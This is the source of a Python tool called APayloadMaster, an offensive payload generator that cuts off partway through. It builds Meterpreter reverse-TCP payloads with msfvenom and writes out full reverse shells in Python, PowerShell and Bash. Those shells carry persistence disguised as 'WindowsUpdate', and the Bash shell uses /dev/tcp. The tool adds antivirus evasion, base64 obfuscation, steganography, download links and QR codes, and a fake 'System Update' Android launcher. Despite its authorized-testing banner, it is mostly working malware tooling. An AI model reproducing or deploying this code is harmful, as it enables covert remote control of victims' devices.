#!/usr/bin/env python3
"""
APayloadMaster - Complete Working Version
For Kali Linux & Termux
Author: mahi.cyberaware
"""

import os
import sys
import subprocess
import socket
import threading
import time
import json
import base64
import hashlib
from datetime import datetime
import http.server
import socketserver
import urllib.parse

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'

class APayloadMaster:
    def __init__(self):
        self.colors = Colors()
        self.local_ip = self.get_local_ip()
        self.current_payload = None
        self.ngrok_process = None
        self.http_server = None
        self.db_file = "payloads.db"
        
        # Create directories
        self.create_directories()
        
    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 1))
            ip = s.getsockname()[0]
        except Exception:
            ip = '127.0.0.1'
        finally:
            s.close()
        return ip
    
    def create_directories(self):
        """Create necessary directories"""
        dirs = [
            "output/payloads",
            "output/bound", 
            "output/encrypted",
            "output/obfuscated",
            "server/uploads",
            "downloads",
            "logs"
        ]
        for d in dirs:
            os.makedirs(d, exist_ok=True)
    
    def display_banner(self):
        """Display modern professional banner"""
        banner = f"""
{self.colors.PURPLE}
███╗   ███╗ █████╗ ██╗  ██╗██╗ ██████╗██╗   ██╗██████╗ ███████╗██████╗ 
████╗ ████║██╔══██╗██║  ██║██║██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
██╔████╔██║███████║███████║██║██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝
██║╚██╔╝██║██╔══██║██╔══██║██║██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗
██║ ╚═╝ ██║██║  ██║██║  ██║██║╚██████╗   ██║   ██████╔╝███████╗██║  ██║
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
{self.colors.ENDC}
{self.colors.RED}      ╔═══════════════════════════════════════════════════════╗
      ║        APayloadMaster - Professional Edition v3.0       ║
      ║              Advanced Security Assessment Tool          ║
      ╚═══════════════════════════════════════════════════════╝{self.colors.ENDC}

{self.colors.CYAN}┌─────────────────────────────────────────────────────────────────┐
│  Author: {self.colors.YELLOW}mahi.cyberaware{self.colors.CYAN}                                    │
│  Local IP: {self.colors.GREEN}{self.local_ip:<15}{self.colors.CYAN}                              │
│  Platform: {sys.platform:<10} Python: {sys.version_info.major}.{sys.version_info.minor}             │
└─────────────────────────────────────────────────────────────────┘{self.colors.ENDC}

{self.colors.YELLOW}⚠️  LEGAL NOTICE: FOR AUTHORIZED SECURITY TESTING ONLY ⚠️
{self.colors.ENDC}{self.colors.BLUE}
• Use only on systems you own or have explicit permission to test
• Compliance with local laws and regulations is mandatory
• Educational and authorized professional use only
{self.colors.ENDC}
"""
        print(banner)
    
    def check_dependencies(self):
        """Check if required tools are installed"""
        tools = {
            'msfvenom': 'Metasploit Framework',
            'apktool': 'APK Tool',
            'ngrok': 'Ngrok (optional for port forwarding)'
        }
        
        missing = []
        for tool, name in tools.items():
            try:
                subprocess.run(['which', tool], capture_output=True, check=True)
            except:
                missing.append(name)
        
        return missing
    
    # ===== PAYLOAD CREATION =====
    
    def create_payload_menu(self):
        """Main payload creation menu"""
        while True:
            print(f"\n{self.colors.GREEN}[PAYLOAD CREATION]{self.colors.ENDC}")
            print("="*50)
            print(f"{self.colors.CYAN}Connection Methods:{self.colors.ENDC}")
            print("1. Localhost (Direct connection)")
            print("2. Ngrok Port Forwarding")
            print("3. Cloudflare Tunnel (if configured)")
            print("4. Serveo (SSH Port Forwarding)")
            print("5. Back to Main Menu")
            
            choice = input(f"\n{self.colors.YELLOW}[?] Select connection method: {self.colors.ENDC}")
            
            if choice == "5":
                return
            
            lport = input(f"{self.colors.YELLOW}[?] Enter LPORT (default: 4444): {self.colors.ENDC}") or "4444"
            
            if choice == "1":
                # Localhost
                lhost = self.local_ip
                print(f"{self.colors.GREEN}[+] Using local IP: {lhost}{self.colors.ENDC}")
                self.payload_type_menu(lhost, lport, "localhost")
                
            elif choice == "2":
                # Ngrok Port Forwarding
                self.ngrok_menu(lport)
                
            elif choice == "3":
                # Cloudflare Tunnel
                self.cloudflare_menu(lport)
                
            elif choice == "4":
                # Serveo
                self.serveo_menu(lport)
    
    def ngrok_menu(self, lport):
        """Ngrok port forwarding setup"""
        print(f"\n{self.colors.CYAN}[NGROK SETUP]{self.colors.ENDC}")
        print("1. Use existing ngrok tunnel")
        print("2. Start new ngrok tunnel")
        print("3. Enter custom ngrok URL")
        
        choice = input(f"{self.colors.YELLOW}[?] Select option: {self.colors.ENDC}")
        
        if choice == "1":
            # Get existing tunnel
            try:
                import requests
                resp = requests.get("http://localhost:4040/api/tunnels", timeout=5)
                tunnels = resp.json().get("tunnels", [])
                if tunnels:
                    for tunnel in tunnels:
                        if tunnel["proto"] == "tcp":
                            public_url = tunnel["public_url"]
                            ngrok_host = public_url.split("//")[1].split(":")[0]
                            ngrok_port = public_url.split(":")[-1]
                            print(f"{self.colors.GREEN}[+] Found tunnel: {public_url}{self.colors.ENDC}")
                            self.payload_type_menu(ngrok_host, ngrok_port, "ngrok")
                            return
                print(f"{self.colors.RED}[!] No active ngrok tunnels found{self.colors.ENDC}")
            except:
                print(f"{self.colors.RED}[!] Could not connect to ngrok API{self.colors.ENDC}")
                
        elif choice == "2":
            # Start new tunnel
            ngrok_token = input(f"{self.colors.YELLOW}[?] Enter ngrok auth token (optional): {self.colors.ENDC}")
            if ngrok_token:
                subprocess.run(["ngrok", "authtoken", ngrok_token], capture_output=True)
            
            # Start ngrok in background
            self.ngrok_process = subprocess.Popen(
                ["ngrok", "tcp", lport],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            print(f"{self.colors.GREEN}[*] Starting ngrok on port {lport}...{self.colors.ENDC}")
            time.sleep(3)
            
            # Try to get URL
            try:
                import requests
                resp = requests.get("http://localhost:4040/api/tunnels", timeout=5)
                tunnels = resp.json().get("tunnels", [])
                if tunnels:
                    public_url = tunnels[0]["public_url"]
                    ngrok_host = public_url.split("//")[1].split(":")[0]
                    ngrok_port = public_url.split(":")[-1]
                    print(f"{self.colors.GREEN}[+] Ngrok URL: {public_url}{self.colors.ENDC}")
                    self.payload_type_menu(ngrok_host, ngrok_port, "ngrok")
                else:
                    print(f"{self.colors.YELLOW}[*] Ngrok started but no URL yet. Check: http://localhost:4040{self.colors.ENDC}")
                    self.payload_type_menu("0.tcp.ngrok.io", lport, "ngrok")
            except:
                print(f"{self.colors.YELLOW}[*] Using default ngrok host{self.colors.ENDC}")
                self.payload_type_menu("0.tcp.ngrok.io", lport, "ngrok")
                
        elif choice == "3":
            custom_url = input(f"{self.colors.YELLOW}[?] Enter ngrok URL (e.g., 0.tcp.ngrok.io): {self.colors.ENDC}")
            self.payload_type_menu(custom_url, lport, "ngrok")
    
    def cloudflare_menu(self, lport):
        """Cloudflare tunnel setup"""
        print(f"\n{self.colors.CYAN}[CLOUDFLARE TUNNEL]{self.colors.ENDC}")
        print(f"{self.colors.YELLOW}[*] Cloudflare tunnel setup requires manual configuration{self.colors.ENDC}")
        print("1. Enter custom Cloudflare tunnel URL")
        print("2. Back")
        
        choice = input(f"{self.colors.YELLOW}[?] Select option: {self.colors.ENDC}")
        
        if choice == "1":
            custom_url = input(f"{self.colors.YELLOW}[?] Enter Cloudflare tunnel URL: {self.colors.ENDC}")
            self.payload_type_menu(custom_url, lport, "cloudflare")
    
    def serveo_menu(self, lport):
        """Serveo SSH port forwarding"""
        print(f"\n{self.colors.CYAN}[SERVEO SETUP]{self.colors.ENDC}")
        print(f"{self.colors.YELLOW}[*] Serveo requires SSH access{self.colors.ENDC}")
        custom_url = input(f"{self.colors.YELLOW}[?] Enter Serveo URL (e.g., serveo.net): {self.colors.ENDC}")
        if custom_url:
            self.payload_type_menu(custom_url, lport, "serveo")
    
    def payload_type_menu(self, lhost, lport, connection_type):
        """Select payload type"""
        print(f"\n{self.colors.CYAN}[PAYLOAD TYPE]{self.colors.ENDC}")
        print(f"Connection: {connection_type} | LHOST: {lhost} | LPORT: {lport}")
        print("-"*50)
        print("1. Android APK (Auto-permissions + Auto-start)")
        print("2. Windows EXE")
        print("3. Windows DLL")
        print("4. Linux ELF")
        print("5. Python Script")
        print("6. PowerShell Script")
        print("7. Bash Script")
        print("8. Back")
        
        choice = input(f"\n{self.colors.YELLOW}[?] Select payload type: {self.colors.ENDC}")
        
        if choice == "8":
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Advanced options
        print(f"\n{self.colors.CYAN}[ADVANCED OPTIONS]{self.colors.ENDC}")
        encrypt = input(f"{self.colors.YELLOW}[?] Encrypt payload? (y/n): {self.colors.ENDC}").lower() == 'y'
        obfuscate = input(f"{self.colors.YELLOW}[?] Obfuscate payload? (y/n): {self.colors.ENDC}").lower() == 'y'
        evade_av = input(f"{self.colors.YELLOW}[?] Add AV evasion? (y/n): {self.colors.ENDC}").lower() == 'y'
        
        if choice == "1":
            payload_file = self.create_android_payload(lhost, lport, timestamp, encrypt, obfuscate, evade_av)
        elif choice == "2":
            payload_file = self.create_windows_payload(lhost, lport, timestamp, encrypt, obfuscate, evade_av)
        elif choice == "3":
            payload_file = self.create_windows_dll_payload(lhost, lport, timestamp, encrypt, obfuscate, evade_av)
        elif choice == "4":
            payload_file = self.create_linux_payload(lhost, lport, timestamp, encrypt, obfuscate, evade_av)
        elif choice == "5":
            payload_file = self.create_python_payload(lhost, lport, timestamp, encrypt, obfuscate, evade_av)
        elif choice == "6":
            payload_file = self.create_powershell_payload(lhost, lport, timestamp, encrypt, obfuscate, evade_av)
        elif choice == "7":
            payload_file = self.create_bash_payload(lhost, lport, timestamp, encrypt, obfuscate, evade_av)
        else:
            return
        
        if payload_file and os.path.exists(payload_file):
            self.current_payload = payload_file
            print(f"{self.colors.GREEN}[+] Payload created: {payload_file}{self.colors.ENDC}")
            
            # Calculate hash
            file_hash = self.calculate_hash(payload_file)
            print(f"{self.colors.CYAN}[*] SHA256: {file_hash}{self.colors.ENDC}")
            
            # Ask about listener
            self.ask_start_listener(lhost, lport)
            
            # Ask about distribution
            self.distribution_menu(payload_file)
    
    def create_android_payload(self, lhost, lport, timestamp, encrypt=False, obfuscate=False, evade_av=False):
        """Create Android APK with auto-permissions"""
        output_file = f"output/payloads/android_{timestamp}.apk"
        
        print(f"{self.colors.CYAN}[*] Creating Android payload...{self.colors.ENDC}")
        
        try:
            # Basic payload
            cmd = [
                "msfvenom", "-p", "android/meterpreter/reverse_tcp",
                f"LHOST={lhost}", f"LPORT={lport}",
                "-o", output_file
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                print(f"{self.colors.RED}[!] Error: {result.stderr}{self.colors.ENDC}")
                return None
            
            # Add auto-permissions by modifying APK
            self.enhance_android_apk(output_file)
            
            # Apply additional features if requested
            if encrypt:
                output_file = self.encrypt_payload(output_file, "AES")
            if obfuscate:
                output_file = self.obfuscate_payload(output_file, "medium")
            if evade_av:
                output_file = self.evade_av(output_file, "packer")
            
            return output_file
            
        except Exception as e:
            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
            return None
    
    def enhance_android_apk(self, apk_path):
        """Add auto-permissions and auto-start to Android APK"""
        try:
            # Create a simple batch script to add permissions
            script = f"""#!/bin/bash
echo "[*] Adding auto-permissions to APK..."

# Note: Full APK modification requires apktool, jarsigner
# This is a simplified version

echo "To fully enhance APK, manually:"
echo "1. apktool d {apk_path} -o temp_apk"
echo "2. Edit AndroidManifest.xml to add permissions:"
echo "   - android.permission.INTERNET"
echo "   - android.permission.ACCESS_NETWORK_STATE"
echo "   - android.permission.RECEIVE_BOOT_COMPLETED"
echo "   - android.permission.WAKE_LOCK"
echo "3. apktool b temp_apk -o {apk_path}"
echo "4. jarsigner -keystore debug.keystore {apk_path} androiddebugkey"
"""
            
            script_path = f"enhance_{os.path.basename(apk_path)}.sh"
            with open(script_path, 'w') as f:
                f.write(script)
            
            os.chmod(script_path, 0o755)
            print(f"{self.colors.YELLOW}[*] Enhancement instructions saved to: {script_path}{self.colors.ENDC}")
            
        except Exception as e:
            print(f"{self.colors.RED}[!] Enhancement error: {e}{self.colors.ENDC}")
    
    def create_windows_payload(self, lhost, lport, timestamp, encrypt=False, obfuscate=False, evade_av=False):
        """Create Windows EXE payload"""
        output_file = f"output/payloads/windows_{timestamp}.exe"
        
        print(f"{self.colors.CYAN}[*] Creating Windows payload...{self.colors.ENDC}")
        
        try:
            cmd = [
                "msfvenom", "-p", "windows/meterpreter/reverse_tcp",
                f"LHOST={lhost}", f"LPORT={lport}",
                "-f", "exe", "-o", output_file
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Apply additional features
                if encrypt:
                    output_file = self.encrypt_payload(output_file, "XOR")
                if obfuscate:
                    output_file = self.obfuscate_payload(output_file, "high")
                if evade_av:
                    output_file = self.evade_av(output_file, "upx")
                
                return output_file
            else:
                print(f"{self.colors.RED}[!] Error: {result.stderr}{self.colors.ENDC}")
                return None
                
        except Exception as e:
            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
            return None
    
    def create_windows_dll_payload(self, lhost, lport, timestamp, encrypt=False, obfuscate=False, evade_av=False):
        """Create Windows DLL payload"""
        output_file = f"output/payloads/windows_dll_{timestamp}.dll"
        
        print(f"{self.colors.CYAN}[*] Creating Windows DLL payload...{self.colors.ENDC}")
        
        try:
            cmd = [
                "msfvenom", "-p", "windows/meterpreter/reverse_tcp",
                f"LHOST={lhost}", f"LPORT={lport}",
                "-f", "dll", "-o", output_file
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                if encrypt:
                    output_file = self.encrypt_payload(output_file, "XOR")
                if obfuscate:
                    output_file = self.obfuscate_payload(output_file, "high")
                if evade_av:
                    output_file = self.evade_av(output_file, "upx")
                
                return output_file
            else:
                print(f"{self.colors.RED}[!] Error: {result.stderr}{self.colors.ENDC}")
                return None
                
        except Exception as e:
            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
            return None
    
    def create_linux_payload(self, lhost, lport, timestamp, encrypt=False, obfuscate=False, evade_av=False):
        """Create Linux ELF payload"""
        output_file = f"output/payloads/linux_{timestamp}.elf"
        
        print(f"{self.colors.CYAN}[*] Creating Linux payload...{self.colors.ENDC}")
        
        try:
            cmd = [
                "msfvenom", "-p", "linux/x86/meterpreter/reverse_tcp",
                f"LHOST={lhost}", f"LPORT={lport}",
                "-f", "elf", "-o", output_file
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                if encrypt:
                    output_file = self.encrypt_payload(output_file, "AES")
                if obfuscate:
                    output_file = self.obfuscate_payload(output_file, "medium")
                if evade_av:
                    output_file = self.evade_av(output_file, "packer")
                
                return output_file
            else:
                print(f"{self.colors.RED}[!] Error: {result.stderr}{self.colors.ENDC}")
                return None
                
        except Exception as e:
            print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
            return None
    
    def create_python_payload(self, lhost, lport, timestamp, encrypt=False, obfuscate=False, evade_av=False):
        """Create Python payload with auto-run"""
        output_file = f"output/payloads/python_{timestamp}.py"
        
        payload_code = f'''#!/usr/bin/env python3
# Auto-generated payload - {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
# Author: mahi.cyberaware
import socket
import subprocess
import os
import sys
import platform
import threading
import time
import base64

# Configuration
LHOST = "{lhost}"
LPORT = {lport}

def auto_start():
    """Auto-start mechanism"""
    if platform.system().lower() == "windows":
        # Windows auto-start
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                               0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.argv[0])
            winreg.CloseKey(key)
        except:
            pass
    elif platform.system().lower() == "linux":
        # Linux cron job
        try:
            with open(os.path.expanduser("~/.bashrc"), "a") as f:
                f.write(f"\\npython3 {sys.argv[0]} &\\n")
        except:
            pass

def reverse_shell():
    """Main reverse shell function"""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect((LHOST, LPORT))
            
            # Send system info
            info = f"Platform: {{platform.platform()}}\\nUser: {{os.getenv('USERNAME') or os.getenv('USER')}}\\n"
            s.send(info.encode())
            
            while True:
                try:
                    cmd = s.recv(4096).decode().strip()
                    if not cmd:
                        break
                    
                    if cmd.lower() == "exit":
                        break
                    
                    if cmd.lower() == "background":
                        # Run in background thread
                        t = threading.Thread(target=reverse_shell)
                        t.daemon = True
                        t.start()
                        break
                    
                    # Execute command
                    if cmd.startswith("cd "):
                        os.chdir(cmd[3:])
                        output = f"Changed to: {{os.getcwd()}}"
                    else:
                        try:
                            output = subprocess.check_output(cmd, shell=True, 
                                                           stderr=subprocess.STDOUT).decode()
                        except subprocess.CalledProcessError as e:
                            output = e.output.decode() if e.output else str(e)
                    
                    s.send(output.encode())
                    
                except socket.timeout:
                    s.send(b"[*] Still alive\\n")
                    continue
                except Exception as e:
                    s.send(f"[!] Error: {{str(e)}}\\n".encode())
                    break
            
            s.close()
        except Exception as e:
            pass
        
        time.sleep(10)  # Reconnect delay

if __name__ == "__main__":
    # Auto-start on first run
    auto_start()
    
    # Start reverse shell
    reverse_shell()
'''
        
        with open(output_file, 'w') as f:
            f.write(payload_code)
        
        os.chmod(output_file, 0o755)
        
        # Apply obfuscation if requested
        if obfuscate:
            output_file = self.obfuscate_python_code(output_file)
        
        return output_file
    
    def create_powershell_payload(self, lhost, lport, timestamp, encrypt=False, obfuscate=False, evade_av=False):
        """Create PowerShell payload"""
        output_file = f"output/payloads/powershell_{timestamp}.ps1"
        
        payload_code = f'''# PowerShell Reverse Shell - mahi.cyberaware
$LHOST = "{lhost}"
$LPORT = {lport}

function Reverse-Shell {{
    while ($true) {{
        try {{
            $client = New-Object System.Net.Sockets.TcpClient($LHOST, $LPORT)
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)
            
            # Send system info
            $info = "PowerShell Reverse Shell | User: $env:USERNAME | Host: $env:COMPUTERNAME`n"
            $writer.WriteLine($info)
            $writer.Flush()
            
            while ($true) {{
                try {{
                    $cmd = $reader.ReadLine()
                    if (-not $cmd -or $cmd -eq "exit") {{ break }}
                    
                    try {{
                        $output = Invoke-Expression $cmd 2>&1 | Out-String
                    }} catch {{
                        $output = $_.Exception.Message
                    }}
                    
                    $writer.WriteLine($output)
                    $writer.Flush()
                }} catch {{
                    break
                }}
            }}
            
            $reader.Close()
            $writer.Close()
            $client.Close()
        }} catch {{
            # Connection failed, wait and retry
            Start-Sleep -Seconds 10
        }}
    }}
}}

# Add persistence
$persistencePath = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.ps1"
if (Test-Path $persistencePath) {{
    Copy-Item $MyInvocation.MyCommand.Path -Destination $persistencePath -Force
}}

# Start reverse shell
Reverse-Shell
'''
        
        with open(output_file, 'w') as f:
            f.write(payload_code)
        
        print(f"{self.colors.GREEN}[+] PowerShell payload created{self.colors.ENDC}")
        return output_file
    
    def create_bash_payload(self, lhost, lport, timestamp, encrypt=False, obfuscate=False, evade_av=False):
        """Create Bash payload"""
        output_file = f"output/payloads/bash_{timestamp}.sh"
        
        payload_code = f'''#!/bin/bash
# Bash Reverse Shell - mahi.cyberaware
LHOST="{lhost}"
LPORT={lport}

# Persistence for Linux
add_persistence() {{
    # Add to crontab
    (crontab -l 2>/dev/null; echo "@reboot /bin/bash {output_file}") | crontab -
    # Add to .bashrc
    echo "nohup /bin/bash {output_file} > /dev/null 2>&1 &" >> ~/.bashrc
}}

reverse_shell() {{
    while true; do
        exec 5<>/dev/tcp/$LHOST/$LPORT 2>/dev/null
        if [ $? -eq 0 ]; then
            echo "Connected to $LHOST:$LPORT"
            echo "User: $(whoami) | Host: $(hostname)" >&5
            
            while read -r cmd <&5; do
                if [ -z "$cmd" ]; then
                    break
                fi
                if [ "$cmd" = "exit" ]; then
                    exit 0
                fi
                eval "$cmd" >&5 2>&1
            done
            
            exec 5<&-
            exec 5>&-
        fi
        sleep 10
    done
}}

# Add persistence on first run
add_persistence

# Start reverse shell
reverse_shell
'''
        
        with open(output_file, 'w') as f:
            f.write(payload_code)
        
        os.chmod(output_file, 0o755)
        print(f"{self.colors.GREEN}[+] Bash payload created{self.colors.ENDC}")
        return output_file
    
    def encrypt_payload(self, filepath, method="AES"):
        """Encrypt payload file"""
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            
            if method == "AES":
                from Crypto.Cipher import AES
                from Crypto.Random import get_random_bytes
                
                key = get_random_bytes(32)
                cipher = AES.new(key, AES.MODE_EAX)
                ciphertext, tag = cipher.encrypt_and_digest(data)
                
                encrypted_file = filepath + ".enc"
                with open(encrypted_file, 'wb') as f:
                    f.write(cipher.nonce + tag + ciphertext)
                
                # Save key
                key_file = filepath + ".key"
                with open(key_file, 'wb') as f:
                    f.write(key)
                
                print(f"{self.colors.GREEN}[+] Encrypted with AES | Key: {key_file}{self.colors.ENDC}")
                return encrypted_file
                
            elif method == "XOR":
                # Simple XOR encryption
                key = os.urandom(32)
                encrypted = bytearray()
                for i, byte in enumerate(data):
                    encrypted.append(byte ^ key[i % len(key)])
                
                encrypted_file = filepath + ".xor"
                with open(encrypted_file, 'wb') as f:
                    f.write(encrypted)
                
                key_file = filepath + ".xor.key"
                with open(key_file, 'wb') as f:
                    f.write(key)
                
                print(f"{self.colors.GREEN}[+] Encrypted with XOR | Key: {key_file}{self.colors.ENDC}")
                return encrypted_file
                
        except ImportError:
            print(f"{self.colors.YELLOW}[!] PyCryptodome not installed. Install with: pip3 install pycryptodome{self.colors.ENDC}")
            return filepath
        except Exception as e:
            print(f"{self.colors.RED}[!] Encryption error: {e}{self.colors.ENDC}")
            return filepath
    
    def obfuscate_payload(self, filepath, level="medium"):
        """Obfuscate payload"""
        if filepath.endswith('.py'):
            return self.obfuscate_python_code(filepath)
        
        # For binary files, use UPX packer
        try:
            packed_file = filepath + ".packed"
            subprocess.run(["upx", "--best", "-o", packed_file, filepath], 
                          capture_output=True)
            
            if os.path.exists(packed_file):
                print(f"{self.colors.GREEN}[+] Packed with UPX{self.colors.ENDC}")
                return packed_file
        except:
            pass
        
        return filepath
    
    def obfuscate_python_code(self, filepath):
        """Obfuscate Python code"""
        with open(filepath, 'r') as f:
            code = f.read()
        
        # Simple obfuscation: base64 encode
        encoded = base64.b64encode(code.encode()).decode()
        obfuscated = f'''#!/usr/bin/env python3
# Obfuscated by APayloadMaster
import base64, os, sys
exec(base64.b64decode("{encoded}").decode())
'''
        
        obfuscated_file = filepath.replace('.py', '_obf.py')
        with open(obfuscated_file, 'w') as f:
            f.write(obfuscated)
        
        os.chmod(obfuscated_file, 0o755)
        print(f"{self.colors.GREEN}[+] Python code obfuscated{self.colors.ENDC}")
        return obfuscated_file
    
    def evade_av(self, filepath, technique="packer"):
        """Add AV evasion techniques"""
        if technique == "packer":
            # Try UPX packing
            try:
                packed_file = filepath + ".upx"
                subprocess.run(["upx", "-9", "-o", packed_file, filepath], 
                              capture_output=True)
                if os.path.exists(packed_file):
                    print(f"{self.colors.GREEN}[+] UPX packed for AV evasion{self.colors.ENDC}")
                    return packed_file
            except:
                pass
        
        # Add junk bytes to change signature
        with open(filepath, 'ab') as f:
            f.write(os.urandom(1024))  # Add 1KB junk data
        
        print(f"{self.colors.GREEN}[+] Added junk bytes for AV evasion{self.colors.ENDC}")
        return filepath
    
    def calculate_hash(self, filepath):
        """Calculate SHA256 hash of file"""
        sha256 = hashlib.sha256()
        with open(filepath, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b""):
                sha256.update(chunk)
        return sha256.hexdigest()
    
    def ask_start_listener(self, lhost, lport):
        """Ask to start Metasploit listener"""
        choice = input(f"\n{self.colors.YELLOW}[?] Start Metasploit listener? (y/n): {self.colors.ENDC}")
        
        if choice.lower() == 'y':
            self.start_metasploit_listener(lhost, lport)
    
    def start_metasploit_listener(self, lhost, lport):
        """Start Metasploit multi/handler"""
        rc_file = f"listener_{lport}.rc"
        
        rc_content = f"""use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
"""
        
        with open(rc_file, 'w') as f:
            f.write(rc_content)
        
        print(f"{self.colors.CYAN}[*] Starting Metasploit listener...{self.colors.ENDC}")
        print(f"{self.colors.CYAN}[*] Command: msfconsole -r {rc_file}{self.colors.ENDC}")
        
        # Start in background thread
        def run_listener():
            subprocess.run(["msfconsole", "-r", rc_file])
        
        thread = threading.Thread(target=run_listener)
        thread.daemon = True
        thread.start()
        
        print(f"{self.colors.GREEN}[+] Listener started in background{self.colors.ENDC}")
        print(f"{self.colors.YELLOW}[*] Check sessions with: sessions -l{self.colors.ENDC}")
    
    # ===== BINDING/HIDING =====
    
    def binding_menu(self):
        """Bind/hide payload menu"""
        if not self.current_payload:
            self.current_payload = input(f"{self.colors.YELLOW}[?] Enter payload path: {self.colors.ENDC}")
        
        if not os.path.exists(self.current_payload):
            print(f"{self.colors.RED}[!] Payload not found{self.colors.ENDC}")
            return
        
        print(f"\n{self.colors.GREEN}[BINDING & HIDING]{self.colors.ENDC}")
        print("="*50)
        print("1. Generate QR Code for download")
        print("2. Create download link (HTTP Server)")
        print("3. Hide in Image (Steganography)")
        print("4. Create Windows shortcut")
        print("5. Create Android launcher")
        print("6. Back")
        
        choice = input(f"\n{self.colors.YELLOW}[?] Select option: {self.colors.ENDC}")
        
        if choice == "1":
            self.generate_qr_code(self.current_payload)
        elif choice == "2":
            self.create_download_link(self.current_payload)
        elif choice == "3":
            self.hide_in_image_menu(self.current_payload)
        elif choice == "4":
            self.create_windows_shortcut(self.current_payload)
        elif choice == "5":
            self.create_android_launcher(self.current_payload)
    
    def generate_qr_code(self, filepath):
        """Generate QR code for file download"""
        try:
            import qrcode
        except ImportError:
            print(f"{self.colors.RED}[!] QRCode module not installed. Install with: pip3 install qrcode[pil]{self.colors.ENDC}")
            return
        
        filename = os.path.basename(filepath)
        qr_data = f"http://{self.local_ip}:8080/{urllib.parse.quote(filename)}"
        
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(qr_data)
        qr.make(fit=True)
        
        img = qr.make_image(fill='black', back_color='white')
        qr_file = f"output/bound/{filename}_qr.png"
        img.save(qr_file)
        
        print(f"{self.colors.GREEN}[+] QR code generated: {qr_file}{self.colors.ENDC}")
        print(f"{self.colors.CYAN}[*] Scan to download: {qr_data}{self.colors.ENDC}")
    
    def create_download_link(self, filepath):
        """Create HTTP download link"""
        port = input(f"{self.colors.YELLOW}[?] Enter port (default: 8080): {self.colors.ENDC}") or "8080"
        
        # Copy to server directory
        filename = os.path.basename(filepath)
        server_path = f"server/uploads/{filename}"
        import shutil
        shutil.copy2(filepath, server_path)
        
        download_url = f"http://{self.local_ip}:{port}/{filename}"
        print(f"{self.colors.GREEN}[+] Download link: {download_url}{self.colors.ENDC}")
        
        # Start server if not running
        self.start_http_server(port)
        
        return download_url
    
    def hide_in_image_menu(self, filepath):
        """Menu for hiding payload in image"""
        print(f"\n{self.colors.CYAN}[STEGANOGRAPHY]{self.colors.ENDC}")
        print("1. Use existing image")
        print("2. Download random image")
        print("3. Back")
        
        choice = input(f"{self.colors.YELLOW}[?] Select option: {self.colors.ENDC}")
        
        if choice == "1":
            image_path = input(f"{self.colors.YELLOW}[?] Enter image path: {self.colors.ENDC}")
            if os.path.exists(image_path):
                self.hide_in_image(filepath, image_path)
        elif choice == "2":
            self.download_and_hide_image(filepath)
    
    def hide_in_image(self, payload_path, image_path):
        """Hide payload in image using steghide"""
        try:
            output_image = f"output/bound/{os.path.basename(image_path)}_hidden.jpg"
            cmd = ["steghide", "embed", "-cf", image_path, "-ef", payload_path, "-sf", output_image]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"{self.colors.GREEN}[+] Payload hidden in image: {output_image}{self.colors.ENDC}")
                return output_image
            else:
                print(f"{self.colors.RED}[!] Error: {result.stderr}{self.colors.ENDC}")
                return None
        except FileNotFoundError:
            print(f"{self.colors.RED}[!] steghide not installed. Install with: sudo apt install steghide{self.colors.ENDC}")
            return None
    
    def create_windows_shortcut(self, filepath):
        """Create Windows shortcut file"""
        shortcut_content = f'''[InternetShortcut]
URL=file:///{os.path.abspath(filepath).replace(os.sep, '/')}
IconIndex=0
'''
        
        shortcut_file = f"output/bound/{os.path.basename(filepath)}.url"
        with open(shortcut_file, 'w') as f:
            f.write(shortcut_content)
        
        print(f"{self.colors.GREEN}[+] Windows shortcut created: {shortcut_file}{self.colors.ENDC}")
        return shortcut_file
    
    def create_android_launcher(self, filepath):
        """Create Android launcher icon"""
        launcher_content = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.launcher.app">
    
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="System Update"
        android:theme="@style/AppTheme">
        
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
'''
        
        launcher_file = f"output/bound/{os.path.basename(filepath)}_launcher.xml"
